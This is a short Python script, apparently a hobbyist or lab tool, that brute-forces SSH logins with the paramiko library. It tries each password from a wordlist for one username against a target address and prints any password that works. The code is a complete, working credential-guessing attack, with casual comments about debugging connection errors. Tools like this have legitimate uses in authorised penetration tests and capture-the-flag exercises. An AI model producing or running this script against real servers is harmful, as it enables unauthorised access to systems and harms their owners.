import paramiko
import argparse
import sys
import os #supposedly we want sys and os to open the file, but I don't think that's true

def sshConnect(ip, port, username, password, i):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	response = 0
	try:
		sys.stdout.write("\033[K")	#no idea what this shit means but it clears the line so the carriage return doesn't leave behind anything
		print(f"trying {ip}:{port} for {username}: {password} #{i}", end='\r')
		ssh.connect(ip, port=port, username=username, password=password, banner_timeout=60)
		response = 1
	except paramiko.AuthenticationException:	#no idea why I'm getting "Error reading SSH protocol banner"
		response = 0
	ssh.close()									#^^^ pretty sure it's because I wasn't closing the connection, oops!
	return response


def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required=True)
    parser.add_argument('-w','--wordlist', required=True)
    parser.add_argument('-s','--username', required=True)
    parser.add_argument('-p','--port')
    args = parser.parse_args()

    return args

if __name__ == "__main__":
    argList = arguments()
    ip = argList.url
    wordlist = argList.wordlist
    username = argList.username
    port = 22
    if (argList.port):
    	port = argList.port

    i = 0
    with open(wordlist, 'r') as file:
    	for line in file.readlines():
    		i += 1
    		password = line.strip()
    		try:
	    		response = sshConnect(ip, port, username, password, i)
	    		if (response == 1):
	    			print("\nValid password: " + password)
	    			exit(0)
    		except Exception as e:
    			print(f"Error at password: {password}")
    		pass